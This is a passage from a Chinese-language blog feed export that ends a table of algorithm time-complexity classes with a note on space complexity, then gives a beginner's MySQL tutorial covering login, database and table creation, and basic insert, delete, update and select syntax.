mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><msup><mi>n</mi><mfrac><mn>1</mn><mn>3</mn></mfrac></msup></msup></mrow><annotation encoding="application/x-tex">2^{n^{\frac {1}{3}}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2201em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.2201em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.2245em;"><span style="top:-3.4878em;margin-right:0.0714em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size1 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0314em;"><span style="top:-2.468em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight"><span class="mord mtight">3</span></span></span><span style="top:-3.2255em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.387em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.532em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size1 size6"></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center">用于整数分解与图形同构问题的著名算法</td></tr><tr><td>指数时间</td><td style="text-align:center">E</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">2^{O(n)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.</mn><msup><mn>1</mn><mi>n</mi></msup><mo separator="true">,</mo><mn>1</mn><msup><mn>0</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">1.1^n, 10^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8588em;vertical-align:-0.1944em;"></span><span class="mord">1.</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center">使用动态规划解决旅行推销员问题</td></tr><tr><td>阶乘时间</td><td style="text-align:center"></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">!</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n!)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">!)</span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo stretchy="false">!</mo></mrow><annotation encoding="application/x-tex">n!</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">n</span><span class="mclose">!</span></span></span></span></td><td style="text-align:center">通过暴力搜索解决旅行推销员问题</td></tr><tr><td>指数时间</td><td style="text-align:center">EXPTIME</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>p</mi><mi>o</mi><mi>l</mi><mi>y</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">2^{poly(n)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup><mo separator="true">,</mo><msup><mn>2</mn><msup><mi>n</mi><mn>2</mn></msup></msup></mrow><annotation encoding="application/x-tex">2^n, 2^{n^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1814em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9869em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center"></td></tr><tr><td>双重指数时间</td><td style="text-align:center">2-EXPTIME</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><msup><mn>2</mn><mrow><mi>p</mi><mi>o</mi><mi>l</mi><mi>y</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup></msup></mrow><annotation encoding="application/x-tex">2^{2^{poly(n)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0397em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0397em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9667em;"><span style="top:-2.9667em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5357em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><msup><mn>2</mn><mi>n</mi></msup></msup></mrow><annotation encoding="application/x-tex">2^{2^n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.88em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.88em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7385em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></td><td style="text-align:center">在预膨胀算术中决定一个给定描述的真实性</td></tr></tbody></table><h3 id="空间复杂度"><a href="https://zh.wikipedia.org/wiki/%E7%A9%BA%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6">空间复杂度</a></h3><p>在计算机科学中，一个算法或程序的<strong>空间复杂度</strong>定性地描述该算法或程序运行所需要的存储空间大小。空间复杂度是相应计算问题的输入值的长度的函数，它表示一个算法完全执行所需要的存储空间大小。</p><p>和时间复杂度类似，空间复杂度通常也使用大O记号来渐进地表示，例如<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(nlogn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mi>n</mi></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(2^n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>等；其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>用来表示输入的长度，该值可以影响算法的空间复杂度。</p><p>就像时间复杂度的计算不考虑算法所使用的空间大小一样，空间复杂度也不考虑算法运行需要的时间长短。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> 刷题 </tag>
            
            <tag> 算法 </tag>
            
            <tag> Java </tag>
            
            <tag> C++ </tag>
            
            <tag> 二分查找 </tag>
            
            <tag> 时间复杂度 </tag>
            
            <tag> 空间复杂度 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL数据库学习</title>
      <link href="/posts/52dd7c4f/"/>
      <url>/posts/52dd7c4f/</url>
      
        <content type="html"><![CDATA[<h1>MySQL 数据库学习</h1><h2 id="MySQL数据库软件">MySQL数据库软件</h2><h3 id="安装">安装</h3><p>…</p><h3 id="配置">配置</h3><h4 id="MySQL服务启动">MySQL服务启动</h4><ol><li>手动。</li><li>cmd–&gt; services.msc 打开服务的窗口</li><li>使用管理员打开cmd</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net start mysql //启动mysql的服务</span><br><span class="line">net stop mysql  //关闭mysql服务</span><br></pre></td></tr></table></figure><h4 id="MySQL登录">MySQL登录</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p密码</span><br><span class="line">mysql -hip -uroot -p连接目标的密码</span><br><span class="line">mysql --host=ip --user=root --password=连接目标的密码</span><br></pre></td></tr></table></figure><h4 id="MySQL退出">MySQL退出</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><h4 id="MySQL目录结构">MySQL目录结构</h4><ol><li><p>MySQL安装目录：basedir=“D:/MySQL/MySQL Server 5.7/”</p><ul><li>配置文件 my.ini</li></ul></li><li><p>MySQL数据目录：datadir=“D:/MySQL/MySQL Server 5.7/Data”</p></li><li><p>几个概念</p><ul><li><p>数据库：文件夹</p></li><li><p>表：文件</p></li><li><p>数据：数据</p></li></ul></li></ol><p><img src="MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%81%E8%A1%A8%E3%80%81%E6%95%B0%E6%8D%AE%E7%9A%84%E5%85%B3%E7%B3%BB.webp" alt="MySQL数据库、表、数据的关系"></p><h2 id="SQL">SQL</h2><h3 id="什么是SQL？">什么是SQL？</h3><ul><li><p>Structured Query Language：结构化查询语言</p></li><li><p>其实就是定义了操作所有关系型数据库的规则。</p></li><li><p>每一种数据库操作的方式存在不一样的地方，称为“方言”。</p></li></ul><h3 id="SQL通用语法">SQL通用语法</h3><ul><li><p>SQL 语句可以单行或多行书写，以分号结尾。</p></li><li><p>可使用空格和缩进来增强语句的可读性。</p></li><li><p>MySQL 数据库的 SQL 语句不区分大小写，关键字建议使用大写。</p></li><li><p>3 种注释</p><ul><li>单行注释: – 注释内容(两个横杆后需要加空格！) 或 # 注释内容(mysql 特有)</li><li>多行注释: /* 注释 */</li></ul></li></ul><h3 id="SQL分类">SQL分类</h3><ul><li><p>DDL(Data Definition Language)数据定义语言<br>用来定义数据库对象：数据库，表，列等。关键字：create, drop,alter 等</p></li><li><p>DML(Data Manipulation Language)数据操作语言<br>用来对数据库中表的数据进行增删改。关键字：insert, delete, update 等</p></li><li><p>DQL(Data Query Language)数据查询语言<br>用来查询数据库中表的记录(数据)。关键字：select, where 等</p></li><li><p>DCL(Data Control Language)数据控制语言(了解)<br>用来定义数据库的访问权限和安全级别，及创建用户。关键字：GRANT， REVOKE 等</p></li></ul><p><img src="SQL%E5%88%86%E7%B1%BB.webp" alt="SQL分类"></p><h2 id="DDL-操作数据库、表-数据定义语言">DDL: 操作数据库、表(数据定义语言 )</h2><h3 id="操作数据库：CRUD">操作数据库：CRUD</h3><h4 id="C-Create-创建">C(Create):创建</h4><ul><li><p>创建数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database 数据库名称;</span><br></pre></td></tr></table></figure></li><li><p>创建数据库，判断不存在，再创建：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database if not exists 数据库名称;</span><br></pre></td></tr></table></figure></li><li><p>创建数据库，并指定字符集：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database 数据库名称 character set 字符集名;</span><br></pre></td></tr></table></figure></li><li><p>练习： 创建db4数据库，判断是否存在，并制定字符集为gbk：</p>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database if not exists db4 character set gbk;</span><br></pre></td></tr></table></figure></li></ul><h4 id="R-Retrieve-：查询">R(Retrieve)：查询</h4><ul><li><p>查询所有数据库的名称:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure></li><li><p>查询某个数据库的字符集或查询某个数据库的创建语句：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show create database 数据库名称;</span><br></pre></td></tr></table></figure></li></ul><h4 id="U-Update-修改">U(Update):修改</h4><ul><li><p>修改数据库的字符集：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter database 数据库名称 character set 字符集名称;</span><br></pre></td></tr></table></figure></li></ul><h4 id="D-Delete-删除">D(Delete):删除</h4><ul><li><p>删除数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database 数据库名称;</span><br></pre></td></tr></table></figure></li><li><p>判断数据库存在，存在再删除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database if exists 数据库名称;</span><br></pre></td></tr></table></figure></li></ul><h4 id="使用数据库">使用数据库</h4><ul><li><p>查询当前正在使用的数据库名称：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database();</span><br></pre></td></tr></table></figure></li><li><p>使用数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 数据库名称;</span><br></pre></td></tr></table></figure></li></ul><h3 id="操作表">操作表</h3><h4 id="C-Create-创建-2">C(Create):创建</h4><h5 id="语法">语法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table 表名(</span><br><span class="line">列名1 数据类型1,</span><br><span class="line">列名2 数据类型2,</span><br><span class="line">....</span><br><span class="line">列名n 数据类型n</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="注意">注意</h5><ul><li>最后一列，不需要加逗号（,）。</li></ul><h5 id="数据库类型">数据库类型</h5><ul><li><p><code>int</code>：整数类型</p><ul><li>age int,</li></ul></li><li><p><code>double</code>:小数类型</p><ul><li>score double(5,2),</li></ul></li><li><p><code>date</code>:日期，只包含年月日，yyyy-MM-dd</p></li><li><p><code>datetime</code>:日期，包含年月日时分秒，yyyy-MM-dd HH:mm:ss</p></li><li><p><code>timestamp</code>:时间错类型，包含年月日时分秒，yyyy-MM-dd HH:mm:ss</p><ul><li>如果将来不给这个字段赋值，或赋值为null，则默认使用当前的系统时间，来自动赋值</li></ul></li><li><p><code>varchar</code>：字符串</p><ul><li>name varchar(20):姓名最大20个字符</li><li>zhangsan 8个字符  张三 2个字符</li></ul></li></ul><h5 id="创建表">创建表</h5><pre><code>create table student(id int,name varchar(32),age int,score double(4,1),birthday date,insert_time timestamp);</code></pre><h5 id="复制表">复制表</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table 表名 like 被复制的表名;</span><br></pre></td></tr></table></figure><h4 id="R-Retrieve-：查询-2">R(Retrieve)：查询</h4><ul><li><p>查询某个数据库中所有的表名称：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure></li><li><p>查询表结构：</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc 表名;</span><br></pre></td></tr></table></figure></li></ul><h4 id="U-Update-修改-2">U(Update):修改</h4><ul><li><p>修改表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 rename to 新的表名;</span><br></pre></td></tr></table></figure></li><li><p>修改表的字符集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 character set 字符集名称;</span><br></pre></td></tr></table></figure></li><li><p>添加一列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 add 列名 数据类型;</span><br></pre></td></tr></table></figure></li><li><p>修改列名称 类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 change 列名 新列别 新数据类型;</span><br><span class="line">alter table 表名 modify 列名 新数据类型;</span><br></pre></td></tr></table></figure></li><li><p>删除列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 drop 列名;</span><br></pre></td></tr></table></figure></li></ul><h4 id="D-Delete-删除-2">D(Delete):删除</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop table 表名;</span><br><span class="line">drop table  if exists 表名 ;</span><br></pre></td></tr></table></figure><h2 id="DML-增删改表中数据-数据操作语言">DML: 增删改表中数据(数据操作语言)</h2><h3 id="添加数据">添加数据</h3><h4 id="语法-2">语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名(列名1,列名2,...列名n) values(值1,值2,...值n);</span><br></pre></td></tr></table></figure><h4 id="注意-2">注意</h4><ul><li>列名和值要一一对应。</li><li>如果表名后，不定义列名，则默认给所有列添加值。<ul><li>insert into 表名 values(值1,值2,…值n);</li></ul></li><li>除了数字类型，其他类型需要使用引号(单双都可以)引起来。</li></ul><h3 id="删除数据">删除数据</h3><h4 id="语法-3">语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from 表名 [where 条件];</span><br></pre></td></tr></table></figure><h4 id="注意-3">注意</h4><ul><li>如果不加条件，则删除表中所有记录。</li><li>如果要删除所有记录<ul><li>delete from 表名;<ul><li>– 不推荐使用。（有多少条记录就会执行多少次删除操作。）</li></ul></li><li>TRUNCATE TABLE 表名;<ul><li>– 效率更高，推荐使用。（先删除表，然后再创建一张一样的表。）</li></ul></li></ul></li></ul><h3 id="修改数据">修改数据</h3><h4 id="语法-4">语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update 表名 set 列名1 = 值1, 列名2 = 值2,... [where 条件];</span><br></pre></td></tr></table></figure><h4 id="注意-4">注意</h4><ul><li>如果不加任何条件，则会将表中所有记录全部修改。</li></ul><h2 id="DQL-查询表中的记录-数据查询语言">DQL: 查询表中的记录(数据查询语言)</h2><h3 id="语法-5">语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">select</span><br><span class="line">字段列表</span><br><span class="line">from</span><br><span class="line">表名列表</span><br><span class="line">where</span><br><span class="line">条件列表</span><br><span class="line">group by</span><br><span class="line">分组字段</span><br><span class="line">having</span><br><span class="line">分组之后的条件</span><br><span class="line">order by</span><br><span class="line">排序</span><br><span class="line">limit</span><br><span class="line">分页限定</span><br></pre></td></tr></table></figure><h3 id="基础查询">基础查询</h3><h4 id="多个字段的查询">多个字段的查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段1, 字段2, ... from 表名;</span><br></pre></td></tr></table></figure><ul><li>注意<ul><li>如果查询所有字段，则可以使用 * 来替代字段列表。</li></ul></li></ul><h4 id="去除重复：distinct">去除重复：distinct</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct 字段1, 字段2, ... from 表名;</span><br></pre></td></tr></table></figure><h4 id="计算列">计算列</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段1, 字段2, 字段1 + 字段2 from 表名;</span><br></pre></td></tr></table></figure><ul><li>一般可以使用四则运算计算一些列的值。（一般只会进行数值型的计算）null参与的运算，计算结果都为null。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段1, 字段2, 字段1 + ifnull(字段2, 0) from 表名;</span><br></pre></td></tr></table></figure><ul><li>ifnull(表达式1,表达式2)<ul><li>表达式1：哪个字段需要判断是否为null。</li><li>表达式2：如果该字段为null后的替换值。</li></ul></li></ul><h4 id="起别名">起别名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 字段1, 字段2, 字段1 + ifnull(字段2, 0) as 总和 from 表名;</span><br><span class="line">select 字段1, 字段2, 字段1 + ifnull(字段2, 0) 总和 from 表名;</span><br></pre></td></tr></table></figure><ul><li>as（可以省略）</li></ul><h3 id="条件查询">条件查询</h3><h4 id="语法-6">语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where 条件语句</span><br></pre></td></tr></table></figure><h4 id="运算符">运算符</h4><table><thead><tr><th style="text-align:center">比较运算符</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">&gt; 、&lt;、&lt;=、&gt;=、=、&lt;&gt;</td><td style="text-align:center"><code>&lt;&gt;</code> 在 SQL 中表示不等于，在 mysql 中也可以使用 <code>!=</code> <br/>没有 <code>==</code></td></tr><tr><td style="text-align:center">between…and…</td><td style="text-align:center">在一个范围之内，如：between 100 and 200 相当于条件在 100 到 200 之间，包头又包尾</td></tr><tr><td style="text-align:center">in（集合）</td><td style="text-align:center">集合表示多个值，使用逗号分隔</td></tr><tr><td style="text-align:center">like ‘毛%’</td><td style="text-align:center">模糊查询<br/>占位符 <code>_</code> 表示单个任意字符<br/>占位符 <code>%</code> 表示多个任意字符</td></tr><tr><td style="text-align:center">is [not] null</td><td style="text-align:center">查询某一列[不]为NULL 的值，注：NULL值不能用 <code>=</code> 判断</td></tr></tbody></table><table><thead><tr><th style="text-align:center">逻辑运算符</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">and 或 &amp;&amp;</td><td style="text-align:center">与，SQL 中建议使用前者，后者并不通用。</td></tr><tr><td style="text-align:center">or 或 ||</td><td style="text-align:center">或</td></tr><tr><td style="text-align:center">not 或 !</td><td style="text-align:center">非</td></tr></tbody></table><p>​</p><h3 